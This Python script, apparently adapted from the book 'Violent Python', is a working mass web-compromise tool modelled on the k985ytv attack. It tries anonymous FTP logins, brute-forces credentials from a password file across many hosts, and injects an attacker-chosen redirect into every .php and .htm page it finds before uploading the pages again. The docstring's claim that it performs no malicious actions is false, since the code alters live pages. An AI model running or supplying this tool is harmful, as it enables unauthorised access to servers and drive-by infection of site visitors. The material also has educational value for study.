"""
This script demonstrates the FTP-based infection vector of the k985ytv attack.

In a recent massive compromise, dubbed k985ytv, attackers used anonymous and stolen FTP credentials to gain access to 22,400 unique domains and 536,000 infected pages (Huang, 2011). With access granted, the attackers injected javascript to redirect benign pages to a malicious domain in the Ukraine. Once the infected server redirected the victims, the malicious Ukrainian host exploited victims in order to install a fake antivirus program that stole credit card information from the clients. The k985ytv attack proved to be a resounding success. In the following section, we will recreate this attack in Python.
Examining the FTP logs of the infected servers, we can see exactly what happened. An automated script connected to the target host in order to determine if it contained a default page named index.htm. Next the attacker uploaded a new index.htm, presumably containing the malicious redirection script. The infected server then exploited any vulnerable clients that visited its pages.

Inspired by the book "Violent Python" by TJ O'Connor. I learned a lot from this book and highly recommend it: https://www.nostarch.com/violentpython.

For educational purposes only. Do not use on systems you do not own or have permission to test. This is a simplified demo and does not perform actual malicious actions.
"""

import ftplib
import optparse


def anonLogin(hostname):
    # try login as anonymous first
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login("anonymous", "me@your.com")
        print("[+] " + str(hostname) + " FTP Anonymous Login Succeeded.")
        ftp.quit()
        return True
    except Exception:
        print("[-]" + str(hostname) + " FTP Anonymous Login Failed.")
        return False


def bruteLogin(userName, passFile, hostname):
    # brute force with a passfile
    pF = open(passFile, "r")
    # loop through each line in the password file
    for line in pF.readlines():
        userName = line.split(":")[0]
        password = line.split(":")[1].strip("\r").strip("\n")
        print("[-] Trying: " + str(password))
        try:
            # try to login with each line of password and username
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, password)
            print("[+] " + str(hostname) + " FTP Login Succeeded: " + str(password))
            ftp.quit()
            pF.close()
            return (userName, password)
        except Exception:
            print("[-] " + str(hostname) + " FTP Login Failed.")
            pass
    pF.close()
    print("[-] Password not found or could not bruteforce ftp login.")
    return (None, None)


def returnDefault(ftp):
    try:
        # try to list the directory contents
        dirlist = ftp.nlst()
    except Exception:
        # print something if there s a error in printing
        dirlist = []
        print("[-] Could not list the Directory Contents.")
        print("[-] Skipping to Next target")
        return []
    retList = []
    for filename in dirlist:
        # loop through each file in the directory and look for .php .htm .html files those are default page
        fn = filename.lower()
        if ".php" in fn or ".htm" in fn or ".html" in fn:
            print("[+] Found default page: " + str(filename))
            # add it inside a list then return it
            retList.append(filename)
    return retList


def injectPage(ftp, page, redirect):
    # open the page in write mode adding the .tmp extension
    f = open(page + ".tmp", "w")
    # retrieve it with "RETR" command in ftp and write it inside the opened file f with .tmp
    ftp.retrlines("RETR " + page, lambda line: f.write(line + "\n"))
    print("Downloaded Page: " + page)
    # then write the redirect page in .tmp again
    f.write(redirect)
    f.close()
    # print that the injection is finished
    print("[+] Injected Malicious Iframe on " + page)
    # upload the injected page in ftp with "STOR" command in ftp
    ftp.storlines("STOR " + page, open(page + ".tmp"))
    # print that everythings is finished
    print("[+] Uploaded Injected Page")


# full attack function
def attack(username, password, tgtHost, redirect):
    try:
        # login with ftp first
        ftp = ftplib.FTP(tgtHost)
        ftp.login(username, password)
        # if succed then return the default pages .html .php .htm
        defPage = returnDefault(ftp)
        # loop in default page and inject
        if defPage:
            for page in defPage:
                injectPage(ftp, page, redirect)
    except Exception:
        # handle error and print the attack has failed
        print("[-] FTP Attack Failed.")
        pass


def main():
    # option
    parser = optparse.OptionParser(
        "usage%prog "
        + "-H <target hosts> -r <redirect url> [-f <password file> -u <username>]"
    )
    parser.add_option(
        "-H", dest="tgtHosts", type="string", help="specify all target host"
    )
    parser.add_option("-r", dest="redirect", type="string", help="specify redirect url")
    parser.add_option(
        "-f", dest="passFile", type="string", help="specify password file"
    )
    parser.add_option("-u", dest="userName", type="string", help="specify username")
    (options, args) = parser.parse_args()
    tgtHosts = options.tgtHosts
    redirect = options.redirect
    passFile = options.passFile
    userName = options.userName
    if tgtHosts is None or redirect is None:
        print(parser.usage)
        exit(0)
    # loop through each target host given
    for tgtHost in tgtHosts.split(","):
        userName = None
        password = None
        if anonLogin(tgtHost):
            userName = "anonymous"
            password = "me@your.com"
            print("[+] using anonymous credentials to attack")
            # attack if the login with anonymous work
            attack(userName, password, tgtHost, redirect)

        # if didn t work check if we have a passfile or not if yes we try to brute force
        elif passFile is not None:
            # if the brute force where successful store the username and password
            (userName, password) = bruteLogin(userName, passFile, tgtHost)
        # if the password exist print that we attack with it
        if password is not None:
            print("[+] Using " + str(userName) + "/" + str(password) + " to attack")
            attack(userName, password, tgtHost, redirect)


if __name__ == "__main__":
    main()
# keep learning @Ricci
